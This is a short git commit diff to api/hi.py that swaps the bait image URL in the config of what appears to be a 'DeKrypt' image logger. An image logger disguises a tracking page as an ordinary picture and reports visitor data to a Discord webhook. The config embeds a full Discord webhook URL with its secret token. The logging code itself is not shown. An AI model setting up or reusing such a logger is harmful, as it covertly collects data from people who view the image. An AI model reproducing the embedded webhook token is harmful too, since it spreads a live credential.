6e4a6b1e957ed59b6429f1d4b1106961e3a35daf
TK.King <YAZANHENDIA3@gmail.com>
2025-11-30 21:32:02 +0200

    Update hi.py

--- api/hi.py
+++ api/hi.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1444750666147823716/JwwJ9Q35FydrBYyNitehiHGIzasLlj_UJmIwKS3oQefIEH3S64utzQnthdr80niHh97x",
-    "image": "https://tse4.mm.bing.net/th/id/OIP.6LCMcI2io7KoM2Wnrl_uDQHaHt?rs=1&pid=ImgDetMain&o=7&rm=3", # You can also have a custom image by using a URL argument
+    "image": "https://static.cybertron.com/clx/home/pcs-laps-section/custom-gaming-pcs.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
